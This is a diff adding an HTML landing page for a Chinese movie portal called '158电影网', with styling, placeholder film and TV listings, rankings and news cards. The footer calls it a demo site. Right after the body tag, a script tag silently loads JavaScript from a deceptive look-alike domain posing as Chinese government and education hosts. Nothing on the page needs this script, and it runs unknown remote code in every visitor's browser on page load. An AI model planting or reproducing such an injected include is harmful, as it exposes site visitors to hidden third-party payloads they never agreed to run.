@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="158电影网（158dianyingwang-app）是专注于高清电影、热播电视剧、动漫综艺在线观看的影视门户网站，提供最新影视资讯、排行榜与观影指南。">
+<meta name="keywords" content="158电影网, 158dianyingwang-app, 电影, 电视剧, 影视, 在线观看, 电影推荐">
+<meta name="author" content="158电影网">
+<meta name="robots" content="index, follow">
+<title>158电影网 - 158dianyingwang-app | 高清电影·热播电视剧·动漫综艺在线观看</title>
+<style>
+    /* ===== Reset & Base ===== */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root{
+        --bg:#07091d;
+        --bg2:#0d1230;
+        --card:rgba(255,255,255,.05);
+        --line:rgba(255,255,255,.10);
+        --txt:#eef0fa;
+        --sub:#a8aecd;
+        --acc:#ff2e6a;
+        --acc2:#7b5cff;
+        --gold:#ffb547;
+    }
+    html{ scroll-behavior:smooth; }
+    body{
+        font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+        background:var(--bg);
+        color:var(--txt);
+        line-height:1.7;
+        overflow-x:hidden;
+        -webkit-font-smoothing:antialiased;
+    }
+    a{ color:inherit; text-decoration:none; }
+    ul{ list-style:none; }
+    .wrap{ max-width:1160px; margin:0 auto; padding:0 20px; }
+
+    /* ===== Animated Background ===== */
+    .aurora{ position:fixed; inset:0; z-index:-2; overflow:hidden; }
+    .aurora i{ position:absolute; border-radius:50%; filter:blur(90px); opacity:.5; animation:float 18s ease-in-out infinite; }
+    .aurora i:nth-child(1){ width:420px;height:420px;background:#7b5cff;top:-120px;left:-80px; }
+    .aurora i:nth-child(2){ width:380px;height:380px;background:#ff2e6a;bottom:-100px;right:-60px;animation-delay:-6s; }
+    .aurora i:nth-child(3){ width:300px;height:300px;background:#00d4b8;top:40%;left:50%;animation-delay:-11s; }
+    @keyframes float{ 0%,100%{ transform:translate(0,0) scale(1);} 33%{ transform:translate(60px,-40px) scale(1.15);} 66%{ transform:translate(-40px,50px) scale(.9);} }
+
+    /* ===== Header ===== */
+    header{ position:sticky; top:0; z-index:50; backdrop-filter:blur(14px); background:rgba(7,9,29,.72); border-bottom:1px solid var(--line); }
+    .nav{ display:flex; align-items:center; justify-content:space-between; height:64px; }
+    .logo{ display:flex; align-items:center; gap:10px; font-weight:800; font-size:20px; letter-spacing:.5px; }
+    .logo .badge{ width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--acc),var(--acc2)); display:grid; place-items:center; font-size:15px; box-shadow:0 6px 18px rgba(255,46,106,.4); }
+    .logo span em{ font-style:normal; color:var(--acc); }
+    .menu{ display:flex; gap:6px; }
+    .menu a{ padding:8px 14px; border-radius:999px; font-size:14px; color:var(--sub); transition:.25s; }
+    .menu a:hover{ color:#fff; background:rgba(255,255,255,.08); }
+    .nav-cta{ font-size:13px; padding:8px 18px; border-radius:999px; background:linear-gradient(135deg,var(--acc),var(--acc2)); font-weight:700; box-shadow:0 8px 20px rgba(123,92,255,.35); }
+    .togg{ display:none; width:40px;height:40px;align-items:center;justify-content:center; border-radius:10px; border:1px solid var(--line); cursor:pointer; flex-direction:column; gap:5px; }
+    .togg s{ width:18px;height:2px;background:#fff;border-radius:2px;transition:.3s;}
+
+    /* ===== Hero ===== */
+    .hero{ padding:90px 0 70px; text-align:center; position:relative; }
+    .pill{ display:inline-flex; align-items:center; gap:8px; padding:6px 16px; border-radius:999px; border:1px solid var(--line); background:var(--card); font-size:13px; color:var(--sub); margin-bottom:24px; }
+    .pill b{ color:var(--gold); }
+    h1{ font-size:clamp(30px,6vw,58px); line-height:1.15; font-weight:850; letter-spacing:-1px; }
+    h1 .grad{ background:linear-gradient(100deg,var(--acc),var(--acc2) 55%,var(--gold)); -webkit-background-clip:text; background-clip:text; color:transparent; }
+    .hero p{ max-width:640px; margin:20px auto 0; color:var(--sub); font-size:clamp(14px,2.4vw,17px); }
+    .search{ max-width:560px; margin:34px auto 0; display:flex; gap:8px; padding:8px; border-radius:999px; background:rgba(255,255,255,.07); border:1px solid var(--line); }
+    .search input{ flex:1; background:none; border:none; outline:none; color:#fff; padding:10px 16px; font-size:15px; }
+    .search input::placeholder{ color:#7c83a3; }
+    .search button{ padding:12px 26px; border-radius:999px; border:none; background:linear-gradient(135deg,var(--acc),var(--acc2)); color:#fff; font-weight:700; cursor:pointer; font-size:15px; }
+    .hero-stats{ display:flex; justify-content:center; gap:clamp(20px,5vw,48px); margin-top:46px; flex-wrap:wrap; }
+    .hero-stats div{ text-align:center; }
+    .hero-stats strong{ display:block; font-size:clamp(22px,4vw,32px); font-weight:800; }
+    .hero-stats span{ font-size:13px; color:var(--sub); }
+
+    /* ===== Section Title ===== */
+    .sec{ padding:76px 0; }
+    .sec-head{ display:flex; align-items:flex-end; justify-content:space-between; gap:16px; margin-bottom:36px; flex-wrap:wrap; }
+    .sec-head h2{ font-size:clamp(22px,3.5vw,32px); font-weight:800; display:flex; align-items:center; gap:12px; }
+    .sec-head h2::before{ content:""; width:5px;height:26px;border-radius:4px;background:linear-gradient(var(--acc),var(--acc2)); }
+    .sec-head a{ font-size:13px; color:var(--sub); border:1px solid var(--line); padding:6px 14px; border-radius:999px; }
+
+    /* ===== Cards ===== */
+    .grid{ display:grid; gap:22px; }
+    .g4{ grid-template-columns:repeat(4,1fr); }
+    .g3{ grid-template-columns:repeat(3,1fr); }
+    .g2{ grid-template-columns:repeat(2,1fr); }
+    .card{ background:var(--card); border:1px solid var(--line); border-radius:18px; overflow:hidden; transition:.35s; position:relative; }
+    .card:hover{ transform:translateY(-8px); border-color:rgba(255,46,106,.5); box-shadow:0 22px 50px rgba(0,0,0,.45); }
+    .thumb{ aspect-ratio:3/4; position:relative; overflow:hidden; }
+    .thumb img{ width:100%;height:100%;object-fit:cover;transition:.6s; }
+    .card:hover .thumb img{ transform:scale(1.08); }
+    .tag{ position:absolute; top:12px;left:12px; font-size:12px; font-weight:700; padding:4px 10px; border-radius:6px; background:rgba(0,0,0,.55); backdrop-filter:blur(6px); }
+    .tag.hot{ background:var(--acc); }
+    .tag.new{ background:var(--acc2); }
+    .score{ position:absolute; top:12px;right:12px; font-size:13px; font-weight:800; color:#fff; padding:4px 10px; border-radius:6px; background:rgba(0,0,0,.55); }
+    .score i{ color:var(--gold); font-style:normal; }
+    .cbody{ padding:14px 16px 16px; }
+    .cbody h3{ font-size:15px; font-weight:700; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+    .cbody p{ font-size:13px; color:var(--sub); margin-top:6px; display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; overflow:hidden; }
+
+    /* ===== Category Pills ===== */
+    .cats{ display:flex; gap:10px; flex-wrap:wrap; margin-bottom:30px; }
+    .cats a{ padding:9px 20px; border-radius:999px; border:1px solid var(--line); font-size:14px; color:var(--sub); transition:.25s; }
+    .cats a.on,.cats a:hover{ color:#fff; border-color:transparent; background:linear-gradient(135deg,var(--acc),var(--acc2)); }
+
+    /* ===== Ranking ===== */
+    .rank{ counter-reset:r; }
+    .rank .card{ display:flex; gap:14px; padding:12px; align-items:center; }
+    .rank .thumb{ width:76px; height:76px; aspect-ratio:1; border-radius:12px; flex:none; }
+    .rank .cbody{ padding:0; }
+    .rank .card::before{ counter-increment:r; content:counter(r); position:absolute; left:-8px; top:-8px; width:28px;height:28px; border-radius:8px; background:linear-gradient(135deg,var(--acc),var(--acc2)); display:grid; place-items:center; font-size:13px; font-weight:800; box-shadow:0 6px 14px rgba(0,0,0,.4); }
+
+    /* ===== News ===== */
+    .news .card{ display:flex; flex-direction:column; }
+    .news .thumb{ aspect-ratio:16/9; }
+    .meta{ display:flex; gap:12px; font-size:12px; color:var(--sub); margin-top:10px; flex-wrap:wrap; }
+    .meta b{ color:var(--acc2); }
+
+    /* ===== Feature ===== */
+    .feat{ display:grid; grid-template-columns:1.05fr .95fr; gap:40px; align-items:center; }
+    .feat-txt h2{ font-size:clamp(24px,4vw,38px); font-weight:850; line-height:1.25; }
+    .feat-txt p{ color:var(--sub); margin-top:16px; }
+    .feat-list{ margin-top:26px; }
+    .feat-list li{ display:flex; gap:14px; padding:14px 0; border-bottom:1px dashed var(--line); }
+    .feat-list li:last-child{ border:none; }
+    .feat-list .ic{ width:42px;height:42px;flex:none;border-radius:12px;display:grid;place-items:center;font-size:20px;background:linear-gradient(135deg,rgba(255,46,106,.25),rgba(123,92,255,.25)); border:1px solid var(--line); }
+    .feat-list h4{ font-size:16px; }
+    .feat-list span{ font-size:13px; color:var(--sub); }
+    .mock{ border-radius:22px; border:1px solid var(--line); background:linear-gradient(160deg,rgba(255,255,255,.07),rgba(255,255,255,.02)); padding:20px; }
+    .mock .bar{ display:flex; gap:8px; margin-bottom:16px; }
+    .mock .bar i{ width:11px;height:11px;border-radius:50%;background:rgba(255,255,255,.18); }
+    .mock .row{ height:14px; border-radius:8px; background:rgba(255,255,255,.08); margin-bottom:12px; }
+    .mock .row:nth-child(3){ width:80%; }
+    .mock .row:nth-child(4){ width:60%; }
+    .mock .tiles{ display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-top:18px; }
+    .mock .tiles i{ aspect-ratio:3/4; border-radius:10px; background:linear-gradient(135deg,var(--acc),var(--acc2)); opacity:.8; }
+
+    /* ===== CTA ===== */
+    .cta{ text-align:center; padding:80px 20px; border-radius:28px; border:1px solid var(--line); background:radial-gradient(120% 120% at 50% 0%,rgba(123,92,255,.28),rgba(7,9,29,.6) 60%); }
+    .cta h2{ font-size:clamp(24px,4.5vw,40px); font-weight:850; }
+    .cta p{ color:var(--sub); margin:14px 0 26px; }
+    .cta a{ display:inline-block; padding:14px 36px; border-radius:999px; background:linear-gradient(135deg,var(--acc),var(--acc2)); font-weight:800; font-size:16px; box-shadow:0 14px 34px rgba(255,46,106,.4); }
+
+    /* ===== Footer ===== */
+    footer{ border-top:1px solid var(--line); padding:50px 0 30px; margin-top:30px; }
+    .foot{ display:grid; grid-template-columns:2fr 1fr 1fr 1fr; gap:30px; }
+    .foot h5{ font-size:15px; margin-bottom:14px; }
+    .foot a{ display:block; font-size:13px; color:var(--sub); padding:5px 0; transition:.2s; }
+    .foot a:hover{ color:var(--acc); }
+    .brand p{ font-size:13px; color:var(--sub); margin-top:12px; max-width:300px; }
+    .copy{ text-align:center; color:var(--sub); font-size:12px; margin-top:40px; padding-top:22px; border-top:1px solid var(--line); }
+    .copy b{ color:var(--acc); }
+
+    /* ===== Top link ===== */
+    .top{ position:fixed; right:20px; bottom:24px; width:46px;height:46px; border-radius:50%; display:grid; place-items:center; background:linear-gradient(135deg,var(--acc),var(--acc2)); box-shadow:0 10px 26px rgba(0,0,0,.45); font-size:18px; z-index:40; }
+
+    /* ===== Responsive ===== */
+    @media(max-width:900px){
+        .g4{ grid-template-columns:repeat(2,1fr); }
+        .g3,.g2{ grid-template-columns:1fr; }
+        .feat{ grid-template-columns:1fr; }
+        .foot{ grid-template-columns:1fr 1fr; }
+    }
+    @media(max-width:680px){
+        .togg{ display:flex; }
+        .menu{ position:fixed; inset:64px 0 0 0; background:rgba(7,9,29,.97); backdrop-filter:blur(20px); flex-direction:column; padding:26px 20px; gap:4px; transform:translateX(100%); transition:.35s; z-index:49; }
+        .menu.open{ transform:translateX(0); }
+        .menu a{ font-size:17px; padding:14px 18px; border-radius:12px; }
+        .nav-cta{ display:none; }
+        .sec{ padding:54px 0; }
+        .search{ flex-direction:column; border-radius:20px; }
+        .search button{ border-radius:14px; }
+        .foot{ grid-template-columns:1fr; }
+        .hero{ padding:56px 0 44px; }
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 动态背景 -->
+<div class="aurora" aria-hidden="true"><i></i><i></i><i></i></div>
+
+<!-- ===== 顶部导航 ===== -->
+<header>
+    <div class="wrap nav">
+        <a class="logo" href="#top" title="158电影网 首页">
+            <span class="badge">1</span>
+            <span>1<em>58</em>电影网</span>
+        </a>
+        <nav class="menu" id="menu">
+            <a href="#hot" title="158电影网 热映推荐">热映推荐</a>
+            <a href="#tv" title="158电影网 电视剧">电视剧</a>
+            <a href="#rank" title="158电影网 影视排行榜">排行榜</a>
+            <a href="#news" title="158电影网 影视资讯">影视资讯</a>
+            <a href="#about" title="158电影网 关于我们">关于我们</a>
+        </nav>
+        <a class="nav-cta" href="#hot" title="158电影网 开始观影">开始观影</a>
+        <div class="togg" id="togg" aria-label="菜单"><s></s><s></s><s></s></div>
+    </div>
+</header>
+
+<!-- ===== 首屏 ===== -->
+<section class="hero" id="top">
+    <div class="wrap">
+        <span class="pill"><b>●</b> 158dianyingwang-app · 每日更新 · 高清流畅</span>
+        <h1>随心所看，尽在 <span class="grad">158电影网</span></h1>
+        <p>158电影网（158dianyingwang-app）汇聚院线大片、热播剧集、口碑动漫与综艺，提供最新影视资讯、实时热度排行与个性化观影指南，让每一次打开都有好片可看。</p>
+        <form class="search" onsubmit="return false;">
+            <input type="search" placeholder="搜索电影、电视剧、演员、导演…" aria-label="搜索影视">
+            <button type="submit">搜 索</button>
+        </form>
+        <div class="hero-stats">
+            <div><strong>12,800+</strong><span>影视资源</span></div>
+            <div><strong>98%</strong><span>高清覆盖率</span></div>
+            <div><strong>60,000+</strong><span>每日观影</span></div>
+            <div><strong>4.9</strong><span>用户评分</span></div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 栏目一：热映推荐 ===== -->
+<section class="sec" id="hot">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>热映推荐</h2>
+            <a href="#" title="158电影网 更多热映">查看更多 →</a>
+        </div>
+        <div class="cats">
+            <a class="on" href="#" title="158电影网 全部">全部</a>
+            <a href="#" title="158电影网 动作片">动作</a>
+            <a href="#" title="158电影网 喜剧片">喜剧</a>
+            <a href="#" title="158电影网 科幻片">科幻</a>
+            <a href="#" title="158电影网 爱情片">爱情</a>
+            <a href="#" title="158电影网 悬疑片">悬疑</a>
+            <a href="#" title="158电影网 纪录片">纪录片</a>
+        </div>
+        <div class="grid g4">
+            <article class="card">
+                <div class="thumb">
+                    <img src="https://picsum.photos/id/1015/400/540" alt="电影《星际回响》海报" loading="lazy">
+                    <span class="tag hot">热映</span>
+                    <span class="score"><i>★</i> 9.2</span>
+                </div>
+                <div class="cbody">
+                    <h3>星际回响</h3>
+                    <p>科幻 / 冒险 · 148分钟 · 导演：陈知行。一场跨越星系的救援，重新定义人类与宇宙的关系。</p>
+                </div>
+            </article>
+            <article class="card">
+                <div class="thumb">
+                    <img src="https://picsum.photos/id/1025/400/540" alt="电影《无名之夜》海报" loading="lazy">
+                    <span class="tag new">新片</span>
+                    <span class="score"><i>★</i> 8.7</span>
+                </div>
+                <div class="cbody">
+                    <h3>无名之夜</h3>
+                    <p>悬疑 / 犯罪 · 112分钟。雨夜连环案件，真相藏在每一帧细节里。</p>
+                </div>
+            </article>
+            <article class="card">
+                <div class="thumb">
+                    <img src="https://picsum.photos/id/1035/400/540" alt="电影《山海情书》海报" loading="lazy">
+                    <span class="tag">口碑</span>
+                    <span class="score"><i>★</i> 9.0</span>
+                </div>
+                <div class="cbody">
+                    <h3>山海情书</h3>
+                    <p>剧情 / 爱情 · 126分钟。两代人、三座城，一封未寄出的信。</p>
+                </div>
+            </article>
+            <article class="card">
+                <div class="thumb">
+                    <img src="https://picsum.photos/id/1045/400/540" alt="电影《极限竞速》海报" loading="lazy">
+                    <span class="tag hot">热映</span>
+                    <span class="score"><i>★</i> 8.4</span>
+                </div>
+                <div class="cbody">
+                    <h3>极限竞速</h3>
+                    <p>动作 / 运动 · 135分钟。引擎轰鸣，弯道即人生。</p>
+                </div>
+            </article>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 栏目二：电视剧 ===== -->
+<section class="sec" id="tv" style="padding-top:0;">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>追剧不停 · 电视剧</h2>
+            <a href="#" title="158电影网 更多剧集">剧集库 →</a>
+        </div>
+        <div class="grid g3">
+            <article class="card">
+                <div class="thumb" style="aspect-ratio:16/9;">
+                    <img src="https://picsum.photos/id/1055/600/340" alt="电视剧《长安十二时辰》剧照" loading="lazy">
+                    <span class="tag hot">更新至28集</span>
+                </div>
+                <div class="cbody">
+                    <h3>长安十二时辰</h3>
+                    <p>古装 / 悬疑 · 豆瓣 8.9。二十四小时，一座城，一场生死博弈。</p>
+                </div>
+            </article>
+            <article class="card">
+                <div class="thumb" style="aspect-ratio:16/9;">
+                    <img src="https://picsum.photos/id/1065/600/340" alt="电视剧《沉默的真相》剧照" loading="lazy">
+                    <span class="tag new">全网独播</span>
+                </div>
+                <div class="cbody">
+                    <h3>沉默的真相</h3>
+                    <p>犯罪 / 剧情。以一人之死，换万千公道。</p>
+                </div>
+            </article>
+            <article class="card">
+                <div class="thumb" style="aspect-ratio:16/9;">
+                    <img src="https://picsum.photos/id/1075/600/340" alt="电视剧《时光代理人》剧照" loading="lazy">
+                    <span class="tag">完结</span>
+                </div>
+                <div class="cbody">
+                    <h3>时光代理人</h3>
+                    <p>奇幻 / 治愈。进入照片，改写遗憾。</p>
+                </div>
+            </article>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 栏目三：影视排行榜 ===== -->
+<section class="sec rank" id="rank" style="padding-top:0;">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>影视排行榜</h2>
+            <a href="#" title="158电影网 完整榜单">完整榜单 →</a>
+        </div>
+        <div class="grid g2">
+            <div class="card">
+                <div class="thumb"><img src="https://picsum.photos/id/1085/150/150" alt="榜单影片" loading="lazy"></div>
+                <div class="cbody">
+                    <h3>星际回响</h3>
+                    <p>票房 26.8亿 · 口碑科幻标杆</p>
+                </div>
+            </div>
+            <div class="card">
+                <div class="thumb"><img src="https://picsum.photos/id/1095/150/150" alt="榜单影片" loading="lazy"></div>
+                <div class="cbody">
+                    <h3>山海情书</h3>
+                    <p>评分 9.0 · 年度情感佳作</p>
+                </div>
+            </div>
+            <div class="card">
+                <div class="thumb"><img src="https://picsum.photos/id/1105/150/150" alt="榜单影片" loading="lazy"></div>
+                <div class="cbody">
+                    <h3>无名之夜</h3>
+                    <p>悬疑黑马 · 反转不断</p>
+                </div>
+            </div>
+            <div class="card">
+                <div class="thumb"><img src="https://picsum.photos/id/1115/150/150" alt="榜单影片" loading="lazy"></div>
+                <div class="cbody">
+                    <h3>极限竞速</h3>
+                    <p>动作爽片 · 视听盛宴</p>
+                </div>
+            </div>
+            <div class="card">
+                <div class="thumb"><img src="https://picsum.photos/id/1125/150/150" alt="榜单影片" loading="lazy"></div>
+                <div class="cbody">
+                    <h3>长安十二时辰</h3>
+                    <p>古装悬疑 · 口碑剧王</p>
+                </div>
+            </div>
+            <div class="card">
+                <div class="thumb"><img src="https://picsum.photos/id/1135/150/150" alt="榜单影片" loading="lazy"></div>
+                <div class="cbody">
+                    <h3>沉默的真相</h3>
+                    <p>现实题材 · 震撼人心</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 栏目四：平台特色 ===== -->
+<section class="sec" id="feature" style="padding-top:0;">
+    <div class="wrap feat">
+        <div class="feat-txt">
+            <span class="pill">为什么选择 158电影网</span>
+            <h2>好看、好找、<br>好用的影视门户</h2>
+            <p>158电影网（158dianyingwang-app）以「内容 + 体验」为核心，从选片、找片到观影，每一处细节都为影迷考量。</p>
+            <ul class="feat-list">
+                <li><span class="ic">🎬</span><div><h4>片源丰富，分类清晰</h4><span>电影、电视剧、动漫、综艺、纪录片全覆盖，多维度筛选一键到位。</span></div></li>
+                <li><span class="ic">⚡</span><div><h4>极速加载，高清流畅</h4><span>自适应码率，移动端省流、大屏清晰，弱网也能顺畅观影。</span></div></li>
+                <li><span class="ic">📊</span><div><h4>实时榜单，拒绝片荒</h4><span>热度榜、好评榜、想看榜每日更新，总有一部适合此刻的你。</span></div></li>
+                <li><span class="ic">📱</span><div><h4>移动端自适应</h4><span>手机、平板、电脑一致体验，通勤追剧无压力。</span></div></li>
+            </ul>
+        </div>
+        <div class="mock" aria-hidden="true">
+            <div class="bar"><i></i><i></i><i></i></div>
+            <div class="row"></div>
+            <div class="row"></div>
+            <div class="row"></div>
+            <div class="tiles"><i></i><i></i><i></i><i></i><i></i><i></i></div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 栏目五：影视资讯 ===== -->
+<section class="sec news" id="news" style="padding-top:0;">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>影视资讯</h2>
+            <a href="#" title="158电影网 更多资讯">资讯中心 →</a>
+        </div>
+        <div class="grid g3">
+            <article class="card">
+                <div class="thumb"><img src="https://picsum.photos/id/1145/600/340" alt="资讯配图" loading="lazy"></div>
+                <div class="cbody">
+                    <h3>2026 国庆档前瞻：五部大片定档，谁将领跑票房？</h3>
+                    <p>从科幻巨制到现实题材，今年国庆档阵容堪称近年最强，158电影网带你一文看懂。</p>
+                    <div class="meta"><span><b>档期解读</b></span><span>3 分钟前</span><span>2.1万阅读</span></div>
+                </div>
+            </article>
+            <article class="card">
+                <div class="thumb"><img src="https://picsum.photos/id/1155/600/340" alt="资讯配图" loading="lazy"></div>
+                <div class="cbody">
+                    <h3>豆瓣 9 分以上的冷门佳作，值得补的 10 部</h3>
+                    <p>不追热点，只荐好片。这份片单专治「片荒」，建议收藏慢慢看。</p>
+                    <div class="meta"><span><b>片单推荐</b></span><span>2 小时前</span><span>8600阅读</span></div>
+                </div>
+            </article>
+            <article class="card">
+                <div class="thumb"><img src="https://picsum.photos/id/1165/600/340" alt="资讯配图" loading="lazy"></div>
+                <div class="cbody">
+                    <h3>流媒体时代，电影院还有存在的必要吗？</h3>
+                    <p>大银幕的仪式感、声画沉浸与社交属性，仍是无法被替代的体验。</p>
+                    <div class="meta"><span><b>行业观察</b></span><span>1 天前</span><span>5400阅读</span></div>
+                </div>
+            </article>
+        </div>
+    </div>
+</section>
+
+<!-- ===== 行动号召 ===== -->
+<div class="wrap">
+    <div class="cta">
+        <h2>打开 158电影网，今晚就看点好的</h2>
+        <p>158dianyingwang-app · 免费注册，个性化推荐，观影记录云端同步</p>
+        <a href="#hot" title="158电影网 立即观影">立即观影</a>
+    </div>
+</div>
+
+<!-- ===== 栏目六：关于我们 / 底部 ===== -->
+<footer id="about">
+    <div class="wrap foot">
+        <div class="brand">
+            <a class="logo" href="#top" title="158电影网">
+                <span class="badge">1</span><span>1<em>58</em>电影网</span>
+            </a>
+            <p>158电影网（158dianyingwang-app）致力于为影迷提供专业、及时、好用的影视内容与资讯服务，做你手机里的私人观影指南。</p>
+        </div>
+        <div>
+            <h5>网站导航</h5>
+            <a href="#hot" title="158电影网 热映推荐">热映推荐</a>
+            <a href="#tv" title="158电影网 电视剧">电视剧</a>
+            <a href="#rank" title="158电影网 排行榜">排行榜</a>
+            <a href="#news" title="158电影网 影视资讯">影视资讯</a>
+        </div>
+        <div>
+            <h5>内容分类</h5>
+            <a href="#" title="158电影网 电影">电影</a>
+            <a href="#" title="158电影网 电视剧">电视剧</a>
+            <a href="#" title="158电影网 动漫">动漫</a>
+            <a href="#" title="158电影网 综艺">综艺</a>
+        </div>
+        <div>
+            <h5>服务与帮助</h5>
+            <a href="#" title="158电影网 观影指南">观影指南</a>
+            <a href="#" title="158电影网 意见反馈">意见反馈</a>
+            <a href="#" title="158电影网 合作入驻">合作入驻</a>
+            <a href="#" title="158电影网 关于我们">关于我们</a>
+        </div>
+    </div>
+    <div class="wrap copy">
+        <p>© 2026 <b>158电影网</b>（158dianyingwang-app）保留所有权利。网站网址：<b>https://域名.github.io</b></p>
+        <p style="margin-top:8px;">本页面为示例站点，所有影片、剧集、评分与数据均为演示用途，不代表真实内容。</p>
+    </div>
+</footer>
+
+<a class="top" href="#top" title="返回顶部" aria-label="返回顶部">↑</a>
+
+<script>
+    // 移动端菜单
+    var togg = document.getElementById('togg');
+    var menu = document.getElementById('menu');
+    togg.addEventListener('click', function(){
+        menu.classList.toggle('open');
+    });
+    menu.addEventListener('click', function(e){
+        if(e.target.tagName === 'A'){ menu.classList.remove('open'); }
+    });
+
+    // 分类高亮
+    var cats = document.querySelectorAll('.cats a');
+    cats.forEach(function(a){
+        a.addEventListener('click', function(e){
+            e.preventDefault();
+            cats.forEach(function(x){ x.classList.remove('on'); });
+            a.classList.add('on');
+        });
+    });
+</script>
+</body>
+</html>
